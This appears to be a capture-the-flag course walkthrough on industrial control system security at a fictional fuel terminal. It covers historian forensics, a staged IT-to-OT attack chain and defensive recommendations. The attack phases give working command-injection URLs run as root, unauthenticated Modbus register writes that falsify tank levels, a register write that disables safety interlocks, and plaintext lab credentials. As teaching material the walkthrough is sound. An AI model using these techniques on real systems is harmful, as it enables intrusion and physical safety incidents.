docs.title: Step 4: Query Tank Readings: Find the Anomaly
docs.text:
The operations manager reported anomalous tank gauge readings. Query recent tank data for TANK-2, ordered by time, to look for sudden changes.

PGPASSWORD='hex_point_2024' psql -h historian.hexpoint.local -U historian -d hpb_historian -c "
SELECT timestamp, tank_id, product, level_pct, temp_f, pressure_psi, flow_bph
FROM tank_readings
WHERE tank_id = 'TANK-2'
ORDER BY timestamp DESC
LIMIT 20;
"
Expected Output 
       timestamp       | tank_id | product  | level_pct | temp_f | pressure_psi | flow_bph
-----------------------+---------+----------+-----------+--------+--------------+----------
 2026-03-18 14:00:00   | TANK-2  | DIESEL   |     42.70 |  143.2 |         14.5 |      0.0
 2026-03-18 13:00:00   | TANK-2  | DIESEL   |     42.80 |  143.1 |         14.5 |      0.0
 2026-03-18 12:00:00   | TANK-2  | DIESEL   |     42.90 |  143.0 |         14.4 |      0.0
 2026-03-18 11:00:00   | TANK-2  | DIESEL   |     43.00 |  142.9 |         14.5 |      0.0
 2026-03-18 10:00:00   | TANK-2  | DIESEL   |     43.10 |  143.0 |         14.5 |      0.0
 2026-03-18 09:00:00   | TANK-2  | DIESEL   |     43.20 |  143.1 |         14.5 |      0.0
 2026-03-18 08:00:00   | TANK-2  | DIESEL   |     43.30 |  143.0 |         14.5 |      0.0
 2026-03-18 07:00:00   | TANK-2  | DIESEL   |     43.40 |  143.1 |         14.5 |      0.0
 2026-03-18 06:00:00   | TANK-2  | DIESEL   |     43.50 |  143.0 |         14.4 |      0.0
 2026-03-17 20:00:00   | TANK-2  | DIESEL   |     48.50 |  142.8 |         14.5 |    520.0
 2026-03-17 19:30:00   | TANK-2  | DIESEL   |     48.50 |  142.8 |         14.5 |    520.0
 2026-03-17 19:00:00   | TANK-2  | DIESEL   |     48.60 |  142.7 |         14.5 |    520.0
 ...

Anomaly Detected

Notice the sudden drop from ~48.50% at 20:00 on March 17 to ~43.50% at 06:00 on March 18. That is a 5% level drop (approximately 600 gallons in a 12,000-gallon tank) over roughly 10 hours, and flow is reported as 0.0 BPH during this period. Product is disappearing from the tank with no recorded flow. Such a pattern is consistent with either a leak or unauthorized register manipulation.

docs.title: Step 5: Correlate with Pipeline Readings
docs.text:
Check whether pipeline readings show any activity during the anomalous period.

PGPASSWORD='hex_point_2024' psql -h historian.hexpoint.local -U historian -d hpb_historian -c "
SELECT timestamp, flow_bph, pressure_psi, volume_bbl, valve_status
FROM pipeline_readings
WHERE timestamp BETWEEN '2026-03-17 18:00:00' AND '2026-03-18 08:00:00'
ORDER BY timestamp;
"
Expected Output 
       timestamp       | flow_bph | pressure_psi | volume_bbl | valve_status
-----------------------+----------+--------------+------------+-------------
 2026-03-17 18:00:00   |    520.0 |         62.3 |   14520.00 | OPEN
 2026-03-17 19:00:00   |    520.0 |         62.1 |   14540.00 | OPEN
 2026-03-17 20:00:00   |      0.0 |         45.0 |   14540.00 | CLOSED
 2026-03-17 21:00:00   |      0.0 |         44.8 |   14540.00 | CLOSED
 2026-03-17 22:00:00   |      0.0 |         44.9 |   14540.00 | CLOSED
 ...
 2026-03-18 06:00:00   |      0.0 |         45.1 |   14540.00 | CLOSED
 2026-03-18 07:00:00   |      0.0 |         45.0 |   14540.00 | CLOSED

Correlation

The pipeline valve closed at 20:00 and flow dropped to zero, yet TANK-2 continued losing product. A closed valve rules out normal pipeline transfer as the cause. The volume loss with zero flow and a closed pipeline is a strong indicator of either a physical leak or data manipulation (someone wrote false level values to the Modbus registers, and the historian recorded the spoofed data).

docs.title: Step 6: Check the Alarm History
docs.text:
Query the alarms table for entries related to TANK-2.

PGPASSWORD='hex_point_2024' psql -h historian.hexpoint.local -U historian -d hpb_historian -c "
SELECT timestamp, source, severity, message, acknowledged
FROM alarms
WHERE source LIKE '%TANK-2%' OR message LIKE '%TANK-2%'
ORDER BY timestamp DESC
LIMIT 10;
"
Expected Output 
       timestamp       |  source  | severity |              message                | acknowledged
-----------------------+----------+----------+-------------------------------------+--------------
 2026-03-18 06:15:00   | TANK-2   | CRITICAL | Level deviation exceeds 3% threshold | false
 2026-03-17 22:00:00   | TANK-2   | WARNING  | Level declining without active flow   | false
 2026-03-17 20:30:00   | TANK-2   | INFO     | Flow stopped, valve closed            | true

Unacknowledged Alarms

Two alarms remain unacknowledged: a WARNING at 22:00 (level declining without flow) and a CRITICAL at 06:15 (3% deviation threshold). In a well-run operation, these would have been investigated immediately. The fact that they remain open suggests either negligent monitoring or intentional suppression.

docs.title: Step 7: Search the Operator Log for the Flag
docs.text:
The operator log records actions taken by personnel and automated systems. Search for anything unusual.

PGPASSWORD='hex_point_2024' psql -h historian.hexpoint.local -U historian -d hpb_historian -c "
SELECT timestamp, operator_name, action, system_note
FROM operator_log
ORDER BY timestamp DESC
LIMIT 15;
"
Expected Output 
       timestamp       | operator_name |        action         |                    system_note
-----------------------+---------------+-----------------------+---------------------------------------------------
 2026-03-18 08:00:00   | j.martinez    | shift_start           | Day shift commenced, reviewing overnight alarms
 2026-03-18 06:15:00   | system        | alarm_generated       | CRITICAL: TANK-2 level deviation
 2026-03-17 22:00:00   | system        | alarm_generated       | WARNING: TANK-2 level declining
 2026-03-17 20:15:00   | unknown       | register_write        | Modbus FC06 from unauthorized source 10.0.0.99
 2026-03-17 20:00:00   | system        | pipeline_shutdown     | Scheduled maintenance window
 2026-03-17 19:45:00   | maint_tech    | maintenance_override  | OCR{...find_me...}
 2026-03-17 16:00:00   | r.chen        | shift_start           | Evening shift commenced
 2026-03-17 08:00:00   | j.martinez    | shift_start           | Day shift commenced
 ...

Flag Captured!

Submit the flag found in the system_note column of the operator log.

The flag is in the system_note column of the maint_tech operator log entry at 19:45 on March 17. That log entry, a maintenance override logged just 30 minutes before the unauthorized register write, is the smoking gun. A "maintenance technician" entered maintenance mode (the same override you discovered in ICS-2.1), and shortly afterward, an unauthorized Modbus write originated from IP 10.0.0.99.

Reconstructing the Attack Timeline

Time Event Evidence 17:45 Maintenance override triggered operator_log: maint_tech / maintenance_override 20:00 Pipeline shutdown (scheduled) pipeline_readings: valve CLOSED, flow 0 20:15 Unauthorized Modbus write from 10.0.0.99 operator_log: unknown / register_write 20:00-06:00 TANK-2 level drops 5% with zero flow tank_readings: level decline, flow_bph = 0 22:00 WARNING alarm (unacknowledged) alarms: level declining without flow 06:15 CRITICAL alarm (unacknowledged) alarms: 3% deviation exceeded

docs.title: Analysis Questions
docs.text:
1. What evidence of compromise did you find in the historian data?

Reveal Answer

Multiple pieces of evidence: (1) An unauthorized Modbus write from IP 10.0.0.99 logged in the operator_log; (2) A maintenance override triggered by an unrecognized maint_tech account 30 minutes before the write; (3) Anomalous tank level data showing a 5% drop with zero flow (physically impossible without a leak or data manipulation); (4) Unacknowledged alarms suggesting either negligence or intentional suppression; (5) Pipeline was closed during the anomaly, ruling out normal transfer.

2. Why is it critical to secure historian databases in ICS environments?

Reveal Answer

Historians are valuable because they: (1) Record evidence of attacks that might otherwise go unnoticed, but only if the attacker cannot modify or delete the records; (2) Bridge IT and OT networks, making them lateral movement targets; (3) Store operational intelligence that reveals production schedules, maintenance windows, and system configurations; (4) Support regulatory compliance, tampered historian data means falsified environmental or safety records, which carries legal liability; (5) Contain credentials or connection strings for other OT services in their configuration.

3. How could an attacker use historian data to plan further attacks?

Reveal Answer

An attacker with historian access could: (1) Learn normal operating ranges for all process values, allowing them to craft manipulations that stay within alarm thresholds; (2) Identify maintenance windows when safety systems are bypassed; (3) Map operator shift schedules to time attacks during shift changes when attention is lowest; (4) Discover correlated processes: e.g., when Pipeline X is active, Tank Y fills, so closing Pipeline X during a fill would cause an overflow; (5) Record historical baselines to replay as "normal" data while executing an attack (the Stuxnet approach).

4. What is the significance of the IP address 10.0.0.99 in the operator log?

Reveal Answer

The IP 10.0.0.99 does not match any known device in the Hex Point Bay Terminal network (the documented devices use offsets 10-14). The mismatch means either: (1) an unauthorized device was connected to the OT network; (2) an attacker spoofed a source IP; or (3) a legitimate device was compromised and used as a pivot point. In a real investigation, you would check switch MAC address tables, DHCP logs, and physical port connections to identify the source.

docs.title: Defensive Recommendations
docs.text: Finding Risk Mitigation Historian accessible with weak credentials (historian / hex_point_2024) Critical Use strong, unique passwords; integrate with Active Directory or LDAP; enforce password rotation No encryption on historian connections (plaintext password in connection string) High Enforce SSL/TLS for all PostgreSQL connections; set sslmode=require in pg_hba.conf Single shared database account for all access High Implement role-based access: read-only for operators, write for SCADA, admin for DBAs only No audit logging of historian queries High Enable PostgreSQL pgaudit extension; log all SELECT/INSERT/UPDATE/DELETE with source IP Historian accessible from all OT network hosts Medium Restrict pg_hba.conf to authorized source IPs (HMI, SCADA server, reporting server) Operator log records show unauthorized access but no automated response Medium Integrate historian alerts with SIEM; auto-block source IPs that generate unauthorized write logs Historical data can be modified without integrity controls High Use append-only tables or write-once storage; implement cryptographic checksums on historian records

docs.title: Key Takeaways
docs.text:
• Process historians are time-series databases that record every SCADA reading and are critical for operations, compliance, and incident investigation
  • Credential discovery in ICS environments is often trivial: predictable passwords, documentation servers, and shared accounts are the norm
  • Historical data tells the story of an attack: correlating tank levels, pipeline flow, alarms, and operator logs reveals the complete attack timeline
  • Unacknowledged alarms are a red flag: they may indicate negligence, insufficient staffing, or intentional suppression by an attacker
  • Historian security requires encrypted connections, strong credentials, role-based access, query audit logging, and data integrity controls
  • Historians bridge IT and OT, making them high-value targets for both intelligence gathering and lateral movement
  • Evidence preservation depends on historian integrity: if an attacker can modify historical records, the investigation is compromised

docs.title: Exercise ICS-3.1: ICS Attack Chain: Chaining the Kill
Engagement Status
docs.text: Reconnaissance Protocol Analysis Exploitation Attack Chaining Defense Analysis

docs.title: Objective
docs.text:
Difficulty: Advanced | Duration: ~40 minutes

Chain the individual vulnerabilities discovered across exercises 1.1 through 2.3 into a single, multi-stage attack that moves from the IT-facing gateway into the OT environment: manipulating physical process values and corrupting the historian database. Assemble a two-part flag along the way.

Goal

Execute a complete ICS kill chain: gain initial access through the RemoteView Gateway, pivot into the Modbus control plane, manipulate process registers, trigger the maintenance override, and correlate evidence in the historian to assemble the flag.

docs.title: The ICS Kill Chain
docs.text:
Traditional IT kill chains (Lockheed Martin Cyber Kill Chain) describe attacks that end at data exfiltration. ICS attacks go further: the ultimate objective is impact on the physical process. MITRE developed the ATT&CK for ICS framework specifically for these environments, defining 12 tactics that trace an adversary's path from initial reconnaissance to physical destruction or disruption.

The key tactics relevant to this exercise:

# Tactic Description This Exercise 1 Initial Access Entry into the ICS network Gateway command injection 2 Execution Running adversary code OS command execution via API 3 Persistence Maintaining access Not covered (single session) 4 Discovery Learning the environment Internal network enumeration 5 Lateral Movement Moving between systems Gateway to Modbus to historian 6 Collection Gathering target data Reading registers and DB records 7 Command and Control Communication channel API as C2 proxy 8 Inhibit Response Function Disabling safety Maintenance override (reg 50) 9 Impair Process Control Disrupting operations Manipulating tank readings 10 Impact Physical consequence Falsified sensor data

docs.title: Real-World Parallels
docs.text:
Stuxnet (2010): The most famous ICS attack targeted Iranian uranium enrichment centrifuges. It crossed the air gap via USB, infected Siemens Step 7 engineering workstations, and injected malicious ladder logic into PLCs. The centrifuges spun outside safe parameters while the HMI displayed normal readings. The attack chain: IT compromise → engineering workstation → PLC code injection → physical damage.

TRITON / TRISIS (2017): Targeted the Triconex Safety Instrumented System (SIS) at a petrochemical plant in Saudi Arabia. The attackers moved through the IT network, reached an engineering workstation, and attempted to disable the safety controller that prevents catastrophic failures. Had it succeeded, it could have allowed a simultaneous process attack to cause an explosion without the SIS shutting down the plant.

Ukraine Power Grid (2015/2016): Attackers gained initial access through spear-phishing emails with malicious Word documents. Over months, they moved laterally through the IT network, harvested VPN credentials, reached the SCADA systems, and remotely opened breakers at three power distribution companies, cutting power to approximately 230,000 customers. They also attacked the UPS systems and call center to inhibit response.

docs.title: Living Off the Land in ICS
docs.text:
A critical concept in ICS attacks is "living off the land": using legitimate protocols and tools rather than custom malware. Modbus TCP has no authentication. Writing a value to a holding register is a normal, expected operation. There is no way for the PLC to distinguish between a legitimate write from the HMI and a malicious write from an attacker. The protocol itself is the weapon.

In this exercise, every action you take uses legitimate functionality: HTTP API calls, standard Modbus read/write operations, and PostgreSQL queries. No exploits, no shellcode, no malware: just protocols doing exactly what they were designed to do, wielded by an unauthorized party.

graph TD
    subgraph "ICS Kill Chain -- Hex Point Bay Terminal"
        A["1. Initial Access<br/>Gateway :8080 API"] --> B["2. Execution<br/>Command Injection<br/>/api/read/;cmd"]
        B --> C["3. Discovery<br/>Internal Network<br/>Enumeration"]
        C --> D["4. Lateral Movement<br/>Modbus Write via<br/>Gateway API"]
        D --> E["5. Impair Process Control<br/>Manipulate Tank<br/>Registers"]
        E --> F["6. Inhibit Response<br/>Maintenance Override<br/>Register 50 = 31337"]
        F --> G["7. Impact<br/>Falsified Sensor Data<br/>Historian Corruption"]
    end

    style A fill:#e74c3c,color:#fff
    style B fill:#e67e22,color:#fff
    style C fill:#f39c12,color:#fff
    style D fill:#d35400,color:#fff
    style E fill:#c0392b,color:#fff
    style F fill:#8e44ad,color:#fff
    style G fill:#2c3e50,color:#fff

docs.title: Tools / Topology
docs.text:
Tools required: curl, psql (PostgreSQL client)

Network topology:

Host Address Role Your workstation VPN interface Attack origin gateway.hexpoint.local <lab_subnet>.13 RemoteView Gateway: API on :8080 sim.hexpoint.local <lab_subnet>.10 Tank simulator: Modbus :502 hmi.hexpoint.local <lab_subnet>.11 HMI dashboard: HTTP :80 historian.hexpoint.local <lab_subnet>.12 PostgreSQL historian: :5432

Replace <lab_subnet>

Substitute <lab_subnet> with your assigned lab network prefix (e.g., 10.0.0). Check the Active Lab View in the platform for your specific addresses.

docs.title: Flag Progress
docs.text: Flag Source Status Fragment 1 Gateway /api/config Pending Fragment 2 Historian correlation Pending Combined: OCR{...} Assembled Pending

docs.title: Phase 1: Initial Access: Gateway Discovery
docs.text: The RemoteView Gateway is the IT-facing component that bridges the corporate network to the OT environment. In a real facility, this would be a remote monitoring appliance or VPN concentrator. At Hex Point Bay Terminal, it exposes an HTTP API on port 8080.

docs.title: Step 1: Discover the RemoteView Gateway
docs.text:
Confirm the gateway is reachable and identify what it serves.

curl -s http://gateway.hexpoint.local:8080/
Expected output 
{"service": "RemoteView Gateway", "version": "1.2.0", "status": "online"}

The gateway identifies itself by name and version. In a real engagement, this banner disclosure alone is a finding: it tells an attacker exactly what software to research for known vulnerabilities.

docs.title: Step 2: Explore the API Documentation
docs.text:
Check whether the API documentation endpoint is accessible.

curl -s http://gateway.hexpoint.local:8080/api/docs
Expected output

The documentation reveals available endpoints, including /api/read/<tank_id>, /api/write, /api/status, and /api/config. It also discloses the hardcoded API key HPB-GW-2024-DEMO used for write operations.

MITRE ATT&CK for ICS: Discovery (TA0102)

Accessing API documentation to learn about available control endpoints maps directly to the Discovery tactic. In real attacks, adversaries study engineering documentation, HMI screens, and protocol specifications to understand the process they intend to manipulate.

docs.title: Step 3: Query the Status Endpoint
docs.text:
curl -s http://gateway.hexpoint.local:8080/api/status
Expected output 
{
  "gateway": "online",
  "modbus_target": "sim.hexpoint.local:502",
  "tanks_monitored": ["TANK-1", "TANK-2", "TANK-3", "TANK-4"],
  "last_poll": "2024-01-15T14:32:00Z"
}

The status endpoint discloses the internal Modbus target address. The disclosed address is the pivot point: the gateway can reach the simulator directly.

docs.title: Step 4: Access the Config Endpoint: Flag Fragment 1
docs.text:
curl -s http://gateway.hexpoint.local:8080/api/config
Expected output

The configuration response includes internal network details, polling intervals, and embedded in the configuration data, the first flag fragment.

Record this fragment. You will combine it with the second fragment at the end of the exercise.

Fragment 1 acquired from the gateway config endpoint.

docs.title: Phase 2: Exploitation: Command Injection
docs.text: The gateway's /api/read/<tank_id> endpoint passes the tank ID directly into a system command without sanitization. The unsanitized endpoint is the same command injection vulnerability identified in Exercise 2.2, but now you will use it as a pivot point rather than an end goal.

docs.title: Step 5: Test Command Injection
docs.text:
Verify the injection works by appending a simple command.

curl -s "http://gateway.hexpoint.local:8080/api/read/TANK-1;id"
Expected output 
uid=0(root) gid=0(root) groups=0(root)

The gateway process runs as root: a critical finding. Any command you inject executes with full system privileges.

Impact

Command injection running as root on a gateway appliance that bridges IT and OT networks is a worst-case scenario. The attacker inherits the gateway's network position and permissions.

docs.title: Step 6: Read the Gateway's Local Flag
docs.text:
While not part of the attack chain flag, confirm full file system access.

curl -s "http://gateway.hexpoint.local:8080/api/read/TANK-1;cat%20/flag.txt"
Expected output 
OCR{...gateway_flag...}

The printed token is the gateway's own flag from Exercise 2.2. You already have it: the point here is confirming arbitrary command execution works.

docs.title: Step 7: Enumerate the Internal Network
docs.text:
Use the gateway's position to discover what other hosts it can reach.

curl -s "http://gateway.hexpoint.local:8080/api/read/TANK-1;cat%20/etc/hosts"
Expected output 
127.0.0.1   localhost
<lab_subnet>.10  sim.hexpoint.local
<lab_subnet>.11  hmi.hexpoint.local
<lab_subnet>.12  historian.hexpoint.local
<lab_subnet>.13  gateway.hexpoint.local
<lab_subnet>.14  docs.hexpoint.local

The gateway has DNS-level knowledge of every host in the OT network. An attacker now has a complete map.

MITRE ATT&CK for ICS: Discovery (TA0102)

Enumerating the internal network from a compromised gateway mirrors real-world ICS attacks where adversaries map SCADA/DCS networks from engineering workstations.

docs.title: Step 8: Read Modbus Registers Through the Gateway
docs.text:
The gateway's legitimate function is reading Modbus registers. Use the API as designed: no injection needed.

curl -s "http://gateway.hexpoint.local:8080/api/read/TANK-1"
curl -s "http://gateway.hexpoint.local:8080/api/read/TANK-2"
Expected output 
{"tank_id": "TANK-1", "level": 7500, "temperature": 68, "status": "normal"}
{"tank_id": "TANK-2", "level": 4200, "temperature": 72, "status": "warning"}

Note that TANK-2 already shows anomalous readings: this is the evidence of the prior unauthorized access from 10.0.0.99 that you identified in the historian during Exercise 2.3.

docs.title: Phase 3: Lateral Movement: Modbus Manipulation
docs.text: The gateway exposes a write endpoint at /api/write. During Exercise 2.2, you discovered that the API key check is broken: the endpoint accepts requests regardless of whether a valid key is provided.

docs.title: Step 9: Write to Tank Registers via the Gateway
docs.text:
Demonstrate that the broken authentication allows unauthorized writes.

curl -s -X POST http://gateway.hexpoint.local:8080/api/write \
  -H "Content-Type: application/json" \
  -d '{"tank_id": "TANK-2", "register": "level", "value": 9999}'
Expected output 
{"status": "success", "tank_id": "TANK-2", "register": "level", "value": 9999}

MITRE ATT&CK for ICS: Impair Process Control (TA0106)

You have just falsified a tank level reading. If this were a real terminal, operators would see an incorrect level on the HMI and could make dangerous operational decisions: such as continuing to fill a tank that appears nearly empty but is actually near capacity.

docs.title: Step 10: Simulate the Original Attack
docs.text:
Replicate what the unauthorized source (10.0.0.99) did: write anomalous values to TANK-2.

curl -s -X POST http://gateway.hexpoint.local:8080/api/write \
  -H "Content-Type: application/json" \
  -d '{"tank_id": "TANK-2", "register": "level", "value": 4200}'

Verify the manipulation took effect by reading the register back.

curl -s "http://gateway.hexpoint.local:8080/api/read/TANK-2"

You have now demonstrated the complete attack path: IT access (gateway API) → command execution → OT manipulation (Modbus register writes). The chained path is exactly how the original attacker compromised TANK-2 readings.

docs.title: Step 11: Trigger the Maintenance Override
docs.text:
The most dangerous action: writing the magic value 31337 to register 50 activates the maintenance override, which disables safety interlocks on the tank monitoring system.

curl -s -X POST http://gateway.hexpoint.local:8080/api/write \
  -H "Content-Type: application/json" \
  -d '{"tank_id": "SYSTEM", "register": 50, "value": 31337}'
Expected output 
{"status": "success", "register": 50, "value": 31337, "warning": "maintenance_override_active"}

MITRE ATT&CK for ICS: Inhibit Response Function (TA0107)

Activating the maintenance override is analogous to what TRITON attempted: disabling the Safety Instrumented System. With interlocks disabled, the physical process has no automated safety net. Overfills, temperature excursions, and pressure buildups would not trigger automatic shutdowns.

Reset the Override

After confirming the override activates, reset it to prevent disrupting other students.

curl -s -X POST http://gateway.hexpoint.local:8080/api/write \
  -H "Content-Type: application/json" \
  -d '{"tank_id": "SYSTEM", "register": 50, "value": 0}'

docs.title: Phase 4: Evidence & Flag Assembly
docs.text: The attack chain is complete. Now correlate the evidence across systems to assemble the final flag.

docs.title: Step 12: Connect to the Historian Database
docs.text:
The historian recorded every register change: including the ones you just made.

psql -h historian.hexpoint.local -U historian -d terminal_data -c \
  "SELECT timestamp, source_ip, action, details FROM operator_log ORDER BY timestamp DESC LIMIT 10;"

When prompted for the password, enter hex_point_2024.

Expected output 
     timestamp        |  source_ip   |    action     |              details
----------------------+--------------+---------------+-----------------------------------
 2024-01-15 14:45:00  | <your_ip>    | register_write | SYSTEM reg50=31337 (override)
 2024-01-15 14:44:30  | <your_ip>    | register_write | TANK-2 level=4200
 2024-01-15 14:44:00  | <your_ip>    | register_write | TANK-2 level=9999
 ...
 2024-01-14 03:17:00  | 10.0.0.99    | register_write | TANK-2 level=4200 (ANOMALY)
 2024-01-14 02:45:00  | 10.0.0.99    | register_write | TANK-2 level=8500 (ANOMALY)

Your actions appear alongside the original attacker's entries. The historian cannot distinguish between the two: both used legitimate Modbus operations through the gateway.

docs.title: Step 13: Correlate the Attack Evidence
docs.text:
Query for the specific attack evidence that connects the gateway to the historian.

psql -h historian.hexpoint.local -U historian -d terminal_data -c \
  "SELECT source_ip, action, details FROM operator_log WHERE source_ip = '10.0.0.99';"
Expected output

The query returns the unauthorized entries from 10.0.0.99: the original attacker. These entries prove the attack chain: the adversary came through the gateway (IT-facing) and manipulated registers that the historian (OT data store) recorded.

The attack path is clear: Gateway (initial access, command injection, broken auth) → Modbus simulator (register manipulation) → Historian (evidence recorded). The flag reflects this chain.

docs.title: Step 14: Assemble the Complete Flag
docs.text:
You have both pieces of the puzzle:

  • Fragment 1 from the gateway /api/config: look for the flag fragment in the config response
  • Fragment 2 derived from the attack chain evidence: correlate the gateway compromise with what was recorded in the historian

Combine the fragments:

echo "<fragment1><fragment2>"

Combine both fragments and submit in the platform to complete Exercise ICS-3.1.

docs.title: Analysis Questions
docs.text:
Q1: How did IT vulnerabilities chain into OT impact?

Answer

The attack chain exploited three IT-class vulnerabilities in sequence: (1) information disclosure on the /api/docs and /api/config endpoints revealed the API key and internal network topology, (2) command injection on /api/read/<tank_id> provided arbitrary OS command execution on the gateway, and (3) broken API key authentication on /api/write allowed unauthorized Modbus register writes. None of these are OT-specific vulnerabilities: they are standard web application flaws. But because the gateway bridges IT and OT networks, these IT vulnerabilities directly enabled manipulation of the physical process (tank levels) and disabling of safety interlocks (maintenance override). The OT protocols themselves (Modbus TCP) have no authentication, so once the attacker reached the control network, there was no further barrier.

Q2: Map your attack to MITRE ATT&CK for ICS tactics.

Answer Step ATT&CK for ICS Tactic Technique API discovery, /api/docs Discovery (TA0102) Remote System Information Discovery Command injection Execution (TA0104) Command-Line Interface /etc/hosts enumeration Discovery (TA0102) Network Connection Enumeration Modbus register reads Collection (TA0100) Point & Tag Identification Register writes (TANK-2) Impair Process Control (TA0106) Modify Parameter Register 50 override Inhibit Response Function (TA0107) Modify Alarm Settings Historian correlation Collection (TA0100) Program Upload Overall impact Impact (TA0105) Manipulation of View / Loss of Safety

Q3: What single defensive measure would best break this chain?

Answer

Network segmentation with a properly configured firewall between IT and OT zones. If the gateway API (IT-facing, port 8080) were on a separate network segment from the Modbus control plane (OT, port 502), command injection on the gateway would not grant access to the simulator's Modbus registers. The attacker could compromise the gateway completely but could not pivot to OT systems. Segmentation is the principle behind the Purdue Model: Level 3 (site operations) should not have direct connectivity to Level 1 (control systems) without passing through a demilitarized zone (DMZ) with strict firewall rules and protocol-aware inspection.

Q4: How does this compare to real-world ICS attacks?

Answer

This exercise mirrors the structure of the Ukraine power grid attacks (2015/2016). In both cases: (1) initial access was through an IT vulnerability (spear-phishing in Ukraine, command injection here), (2) the attackers moved laterally from IT to OT networks using legitimate access paths (VPN credentials in Ukraine, gateway API here), (3) the final impact was achieved using legitimate protocols (opening breakers via SCADA in Ukraine, Modbus writes here), and (4) the attackers also targeted response capabilities (call center DoS in Ukraine, maintenance override here). The key difference is scale and sophistication: the Ukraine attackers spent months inside the network, while this exercise compresses the kill chain into a single session. Stuxnet was even more sophisticated, injecting malicious PLC code rather than just writing register values, and it included rootkit components to hide the modifications from the engineering workstations.

docs.title: Defensive Recommendations
docs.text:
The following table maps each attack phase to the defensive measures that would have prevented or detected it.

Attack Phase Vulnerability Exploited Countermeasure Priority Initial Access API documentation publicly accessible Require authentication for all API endpoints; disable /api/docs in production High Initial Access Config endpoint leaks internal topology Remove sensitive data from API responses; implement role-based access High Execution Command injection in /api/read Input validation and parameterized queries; never pass user input to shell commands Critical Execution Gateway runs as root Run services with least-privilege accounts; use containers with dropped capabilities High Lateral Movement Broken API key authentication Implement proper authentication (mutual TLS, OAuth2); rotate API keys regularly Critical Process Manipulation Modbus TCP has no authentication Deploy Modbus-aware firewalls; implement allowlists for register writes; use OPC UA with authentication where possible Critical Safety Override Register 50 writable from network Physical key switch for maintenance override; require dual authorization for safety-critical changes Critical Evidence Historian accessible with weak credentials Strong passwords; network ACLs limiting historian access to authorized HMI/SCADA sources only High Detection No alerting on anomalous writes Deploy ICS-aware IDS (e.g., Claroty, Dragos, Nozomi); alert on Modbus writes from non-HMI sources High Overall Flat network: all systems reachable Implement Purdue Model segmentation with DMZ between IT and OT; protocol-aware firewalls at each boundary Critical

docs.title: Key Takeaways
docs.text:
• ICS attacks chain IT vulnerabilities to achieve OT impact. The Modbus protocol is not "vulnerable": it is functioning as designed. The vulnerabilities that enabled the attack were all in the IT layer (web application flaws, broken authentication).

  • Legitimate protocols are the weapon. Every Modbus write in this exercise was a valid protocol operation. ICS-aware network monitoring must baseline normal behavior and alert on deviations: source IPs, write frequencies, register ranges, and value bounds.

  • Defense-in-depth is not optional in ICS. A single missing control (input validation, API authentication, network segmentation) was enough to enable the entire chain. Real ICS security requires overlapping layers so that no single failure is catastrophic.

  • The kill chain model helps defenders prioritize. By mapping attacks to frameworks like MITRE ATT&CK for ICS, defenders can identify which phase to break. The cheapest intervention is usually at the IT/OT boundary: proper segmentation eliminates entire categories of lateral movement.

  • Safety and security are intertwined. The maintenance override (register 50) is a safety function. Compromising it through a cyber attack demonstrates that cybersecurity failures can directly cause physical safety incidents: a principle that drives regulations like IEC 62443 and NERC CIP.

docs.title: Exercise ICS-3.2: ICS Defense Analysis: Securing the Terminal
Engagement Status
docs.text: Reconnaissance Protocol Analysis Exploitation Attack Chaining Defense Analysis

docs.title: Objective
docs.text:
Difficulty: Advanced | Duration: ~40 minutes

Conduct a formal security assessment of the Hex Point Bay Terminal, organize all findings from exercises 1.1 through 3.1 using industry frameworks (NIST CSF, IEC 62443), and submit a structured vulnerability report to the docs server to obtain the final course flag.

Goal

Synthesize every vulnerability discovered throughout the course into a professional security assessment report. Categorize findings by risk, map them to ICS security frameworks, propose a segmented network architecture using the Purdue Model, and submit the completed report to receive the final flag.

docs.title: ICS Security Frameworks
docs.text:
Securing industrial control systems requires specialized frameworks that account for the unique constraints of OT environments: safety-critical uptime requirements, legacy systems that cannot be patched, vendor-locked proprietary protocols, and the fundamental tension between operational availability and security controls.

Three frameworks dominate ICS security practice:

NIST Cybersecurity Framework (CSF): A risk-based framework organized around five core functions. Originally developed for critical infrastructure, it provides a common language for security posture assessment.

Function Purpose ICS Example Identify Asset inventory, risk assessment Catalog all PLCs, RTUs, HMIs; assess Modbus exposure Protect Access control, training, data security Network segmentation, operator authentication, encrypted protocols Detect Anomaly detection, continuous monitoring ICS-aware IDS, Modbus traffic baselining, historian audit logs Respond Incident response, communication OT-specific IR playbooks, coordination with operations team Recover Recovery planning, backup/restore Known-good PLC configurations, historian backup verification

IEC 62443: The international standard specifically for Industrial Automation and Control Systems (IACS) security. It defines four Security Levels (SL):

Level Description Example SL 0 No specific requirements Open test/demo environments SL 1 Protection against casual/unintentional violation Basic password protection SL 2 Protection against intentional violation using simple means Role-based access, encrypted communications SL 3 Protection against sophisticated attack with moderate resources Defense-in-depth, IDS, security monitoring SL 4 Protection against state-sponsored attack Air-gapped networks, hardware security modules

NERC CIP: Mandatory standards for the North American bulk electric system. NERC CIP requires identification of Critical Cyber Assets, electronic security perimeters, access management, security awareness training, incident reporting, and recovery plans. Non-compliance carries fines up to $1 million per day per violation.

docs.title: The Purdue Model
docs.text:
The Purdue Enterprise Reference Architecture (PERA) defines a hierarchical model for ICS network segmentation. Each level has a defined purpose, and traffic between levels must pass through controlled boundaries.

graph TB
    subgraph "Level 5: Enterprise Network"
        L5["Corporate IT<br/>Email, ERP, Internet"]
    end

    subgraph "Level 4: Site Business Planning"
        L4["Business Systems<br/>Scheduling, Logistics"]
    end

    subgraph "Level 3.5: IT/OT DMZ"
        DMZ["Demilitarized Zone<br/>Historian Mirror, Patch Server<br/>Jump Host, Data Diode"]
    end

    subgraph "Level 3: Site Operations"
        L3["Operations Management<br/>terminal-docs (docs.hexpoint.local)<br/>modbus-gateway (gateway.hexpoint.local)"]
    end

    subgraph "Level 2: Area Supervisory Control"
        L2["HMI / SCADA<br/>terminal-hmi (hmi.hexpoint.local)<br/>terminal-historian (historian.hexpoint.local)"]
    end

    subgraph "Level 1: Basic Control"
        L1["PLCs / RTUs / Controllers<br/>terminal-sim (sim.hexpoint.local)<br/>Modbus TCP :502"]
    end

    subgraph "Level 0: Physical Process"
        L0["Sensors & Actuators<br/>Tank Level Probes, Valves<br/>TLS-350 ATG :10001"]
    end

    L5 --- L4
    L4 --- DMZ
    DMZ --- L3
    L3 --- L2
    L2 --- L1
    L1 --- L0

    style L5 fill:#3498db,color:#fff
    style L4 fill:#2980b9,color:#fff
    style DMZ fill:#e74c3c,color:#fff
    style L3 fill:#e67e22,color:#fff
    style L2 fill:#f39c12,color:#fff
    style L1 fill:#27ae60,color:#fff
    style L0 fill:#2ecc71,color:#fff

